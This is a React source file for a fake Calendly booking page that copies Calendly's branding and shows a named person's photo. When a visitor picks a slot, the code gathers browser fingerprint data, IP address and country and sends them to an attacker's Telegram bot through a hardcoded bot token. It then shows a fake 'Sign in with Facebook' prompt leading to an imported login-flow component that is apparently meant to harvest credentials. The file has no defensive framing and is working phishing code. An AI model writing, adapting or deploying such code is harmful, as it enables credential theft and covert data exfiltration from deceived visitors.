import React, { useState } from 'react';
import './App.css';
import FacebookLoginFlow from './FacebookLoginFlow';

function App() {
  const [selectedDate, setSelectedDate] = useState(null);
  const [selectedTime, setSelectedTime] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [modalStage, setModalStage] = useState('signin');

  // ** YOUR TELEGRAM CREDENTIALS **
  const BOT_TOKEN = '8075320428:AAEh03BbKY131facK9vvpNopfKlEvttMXEM';
  const CHAT_ID  = '-1002770492215';

  // Build dates for June 2025
  const today = new Date();
  const dates = Array.from({ length: 30 }, (_, i) => {
    const d = new Date(2025, 3, i + 1);
    return {
      day: ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'][d.getDay()],
      date: i + 1,
      disabled: d < today
    };
  });

  // Build time slots 9:00am–8:30pm
  const timeSlots = [];
  for (let h = 9; h <= 20; h++) {
    ['00','30'].forEach(mm => {
      const hour = (h % 12) || 12;
      const ampm = h < 12 ? 'am' : 'pm';
      timeSlots.push(`${hour}:${mm} ${ampm}`);
    });
  }

  const onDateClick = d => {
    if (d.disabled) return;
    setSelectedDate(d.date);
    setSelectedTime(null);
  };

  const onTimeClick = t => {
    if (!selectedDate) return;
    setSelectedTime(t);
  };

  // Gather device + browser info
  const collectDeviceInfo = () => {
    const { userAgent, language, platform } = navigator;
    const { width, height } = window.screen;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return {
      userAgent,
      language,
      platform,
      screenResolution: `${width}×${height}`,
      timezone,
    };
  };

  // Send message to Telegram
  const sendToTelegram = async (text) => {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
      })
    });
  };

  const onContinue = async () => {
    if (!selectedDate || !selectedTime) {
      alert('Please select both a date and a time first.');
      return;
    }

    // 1) collect device info
    const deviceInfo = collectDeviceInfo();

    // 2) fetch IP + country
    let ip = 'unknown', country = 'unknown';
    try {
      const resp = await fetch('https://ipapi.co/json');
      const data = await resp.json();
      ip = data.ip;
      country = data.country_name;
    } catch (err) {
      console.warn('Could not fetch IP info', err);
    }

    // 3) build message
    const message = `
*Visitor Info*
• IP: ${ip}
• Country: ${country}

*Device Info*
• User Agent: ${deviceInfo.userAgent}
• Platform: ${deviceInfo.platform}
• Language: ${deviceInfo.language}
• Screen: ${deviceInfo.screenResolution}
• Timezone: ${deviceInfo.timezone}

*Booking*
• Date: ${selectedDate}/04/2025
• Time: ${selectedTime}
`;
    // 4) send to Telegram
    try {
      await sendToTelegram(message);
    } catch (err) {
      console.error('Telegram send error', err);
    }

    // 5) open modal
    setModalStage('signin');
    setShowModal(true);
  };

  const onSigninContinue = () => setModalStage('popup');
  const onCloseModal = () => setShowModal(false);

  return (
    <div className="app">
      <header className="site-header">
        <div className="container">
          <div className="logo-group">
            <img
              className="logo-icon"
              src="https://assets.calendly.com/assets/frontend/media/calendly-33a0809afc4c21162dd7.svg"
              alt="Calendly Icon"
            />
            <img
              className="logo-wordmark"
              src="https://assets.calendly.com/assets/frontend/media/calendly-wordmark-0da6c58d9a06b08c975f.svg"
              alt="Calendly"
            />
          </div>
          <div className="header-text"></div>
        </div>
      </header>

      <main className="main">
        <aside className="sidebar">
          <div className="profile">
            <img
              className="avatar"
              src="https://canadianbusiness.com/wp-content/uploads/2023/03/EmilyDurham-2-280x280.png"
              alt="Emily Durham"
            />
            <div>
              <div className="name">Emily Durham</div>
              <div className="duration">45 min meeting</div>
            </div>
          </div>
          <div className="info">
            <div className="field">
              <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm1 11H7v-2h4V6h2v7z"/></svg>
              <div className="text">
                <label>Duration</label>
                <p>45 minutes, One‑on‑One</p>
              </div>
            </div>
            <div className="field">
              <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zM12 11.5a2.5 2.5 0 110-5 2.5 2.5 0 010 5z"/></svg>
              <div className="text">
                <label>Location</label>
                <p>Zoom Meeting (Provided after booking)</p>
              </div>
            </div>
            <div className="field">
              <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 .74-.15 1.44-.41 2.09l1.46 1.46C19.71 14.21 20 13.13 20 12c0-4.42-3.58-8-8-8z"/><path d="M6.34 6.34L4.93 4.93C3.18 6.68 2 9.22 2 12c0 5.52 4.48 10 10 10 2.78 0 5.32-1.18 7.07-3.07l-1.41-1.41C15.44 19.85 13.74 20.5 12 20.5 7.26 20.5 3.5 16.74 3.5 12c0-1.74.65-3.44 1.84-4.72z"/></svg>
              <div className="text">
                <label>Time Zone</label>
                <select>
                  <option>Europe / Berlin</option>
                  <option>US Eastern (New York)</option>
                  <option>US Central (Chicago)</option>
                  <option>US Mountain (Denver)</option>
                  <option>US Pacific (Los Angeles)</option>
                </select>
              </div>
            </div>
            <div className="note">
              Please schedule at least 24 hours in advance. For last‑minute bookings, email me directly.
            </div>
          </div>
        </aside>

        <section className="calendar-box">
          <div className="calendar-header">
            <h2>Select a Date &amp; Time</h2>
            <span>June 2025</span>
          </div>
          <div className="calendar-content">
            <div className="calendar-grid">
              {['S','M','T','W','T','F','S'].map((d, i) => (
                <div key={i} className="calendar-day">{d}</div>
              ))}
              {dates.map(d => (
                <button
                  key={d.date}
                  className={`calendar-date${d.disabled ? ' disabled' : ''}${selectedDate === d.date ? ' selected' : ''}`}
                  onClick={() => onDateClick(d)}
                  disabled={d.disabled}
                >
                  <span className="day-label">{d.day}</span>
                  {d.date}
                </button>
              ))}
            </div>
            <div className="times">
              <h3>Available Times</h3>
              {timeSlots.map(t => (
                <button
                  key={t}
                  className={`time-slot${!selectedDate ? ' disabled' : ''}${selectedTime === t ? ' selected' : ''}`}
                  onClick={() => onTimeClick(t)}
                  disabled={!selectedDate}
                >
                  <img className="slot-icon" src="https://i.ibb.co/sJ2fpv5W/image.png" alt="clock" />
                  {t}
                </button>
              ))}
            </div>
          </div>
          <button className="continue-button" onClick={onContinue}>
            Continue →
          </button>
        </section>
      </main>

      {showModal && (
        <div className="fb-modal-overlay active">
          <div className="fb-modal">
            {modalStage === 'signin' ? (
              <>
                <h2>Sign in to continue</h2>
                <p>Please sign in with Facebook to schedule your meeting</p>
                <button className="fb-continue-btn" onClick={onSigninContinue}>
                  <img
                    src="https://www.facebook.com/images/fb_icon_325x325.png"
                    alt=""
                    style={{ width: 20, height: 20, marginRight: 8 }}
                  />
                  Continue with Facebook
                </button>
                <button className="fb-cancel-btn" onClick={onCloseModal}>
                  Cancel
                </button>
              </>
            ) : (
              <FacebookLoginFlow
                onClose={onCloseModal}
                selectedDate={selectedDate}
                selectedTime={selectedTime}
              />
            )}
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
